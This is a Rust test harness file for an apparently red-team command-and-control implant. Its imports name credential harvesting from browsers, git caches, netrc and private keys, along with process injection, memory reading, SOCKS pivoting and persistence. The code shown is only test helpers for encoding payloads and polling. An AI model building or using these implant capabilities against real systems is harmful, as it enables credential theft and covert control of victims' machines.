use std::net::Ipv4Addr;
use std::path::Path;
use std::time::Duration;

/// Serialise tests that mutate the `HOME` environment variable.
///
/// `std::env::set_var` is not thread-safe; multiple `#[tokio::test]` test
/// functions run on separate OS threads even though each one uses a
/// single-threaded Tokio executor.  Any test that writes `HOME` must hold
/// this lock for its entire duration to prevent other tests from seeing a
/// stale or foreign home directory.
static HOME_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

use red_cell_common::demon::{
    DemonCallback, DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage,
    DemonPivotCommand, DemonProcessCommand, DemonSocketCommand, DemonTransferCommand,
};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use super::types::SocksClientState;

use super::{
    ActiveDownload, DownloadTransferState, GroupEntry, HarvestEntry, INJECT_ERROR_FAILED,
    INJECT_WAY_EXECUTE, INJECT_WAY_INJECT, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE,
    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_WRITECOPY, PendingCallback,
    PhantomState, PivotConnection, SessionEntry, UserEntry, capture_x11_native,
    check_ptrace_permission, collect_browser_passwords, collect_git_credential_cache_from,
    collect_netrc, encode_bytes, encode_harvest_entries, encode_u32, execute, find_libc_base,
    is_private_key_bytes, parse_group_entries, parse_logged_on_sessions, parse_logged_on_users,
    parse_memory_region, parse_user_entries, read_from_proc_mem, remove_shell_rc_block,
    resolve_dlopen_in_target,
};
use crate::config::PhantomConfig;
use crate::error::PhantomError;

fn utf16_payload(value: &str) -> Vec<u8> {
    let utf16 = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
    let mut payload = Vec::with_capacity(4 + utf16.len());
    payload.extend_from_slice(&(utf16.len() as i32).to_le_bytes());
    payload.extend_from_slice(&utf16);
    payload
}

fn read_u32(payload: &[u8], offset: &mut usize) -> u32 {
    let end = *offset + 4;
    let value = u32::from_le_bytes(payload[*offset..end].try_into().expect("u32"));
    *offset = end;
    value
}

fn read_u64(payload: &[u8], offset: &mut usize) -> u64 {
    let end = *offset + 8;
    let value = u64::from_le_bytes(payload[*offset..end].try_into().expect("u64"));
    *offset = end;
    value
}

fn read_bytes<'a>(payload: &'a [u8], offset: &mut usize) -> &'a [u8] {
    let len = read_u32(payload, offset) as usize;
    let end = *offset + len;
    let bytes = &payload[*offset..end];
    *offset = end;
    bytes
}

fn read_utf16(payload: &[u8], offset: &mut usize) -> String {
    let bytes = read_bytes(payload, offset);
    let utf16 = bytes
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect::<Vec<_>>();
    String::from_utf16(&utf16).expect("utf16")
}

async fn poll_until<F>(state: &mut PhantomState, mut predicate: F)
where
    F: FnMut(&PhantomState) -> bool,
{
    for _ in 0..100 {
        state.poll().await.expect("poll");
        if predicate(state) {
            return;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }

    panic!("condition not met before poll timeout");
}

async fn poll_n(state: &mut PhantomState, iterations: usize) {
    for _ in 0..iterations {
        state.poll().await.expect("poll");
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
}

mod filesystem;
mod inject;
mod misc;
mod network;
mod persist;
mod process;
